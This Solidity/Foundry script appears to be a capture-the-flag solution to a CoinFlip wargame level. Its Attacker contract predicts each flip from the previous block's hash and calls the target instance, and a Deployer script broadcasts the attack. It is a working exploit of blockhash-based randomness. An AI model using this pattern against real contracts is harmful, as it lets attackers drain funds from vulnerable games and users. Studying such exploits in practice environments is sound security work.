// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface CoinFlip
{
    function flip(bool _guess) external returns (bool);
}

contract Attacker {

    address instAddr   = 0x54a5C8b49B368Ec16dA761dc94FfbbA641a2EaDc;
    uint    FACTOR     = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip cf        = CoinFlip(instAddr);

    function attack()
        public
    {
        uint _blockvalue = uint(blockhash(block.number - 1));
        uint _coinflip   = _blockvalue / FACTOR;
        bool _guess      = _coinflip == 1 ? true : false;
        bool _win        = cf.flip(_guess);
    }
}

contract Deployer is Script {
    function run()
        public
    {
        vm.startBroadcast();
        // Attacker _a = new Attacker();
        Attacker _a = Attacker(0x3818d7D68aecBB41757edA0Af8Fb57E45F94c4E4);
        // To run block.number and flip in same block.        
        _a.attack();
        vm.stopBroadcast();        
    }
}
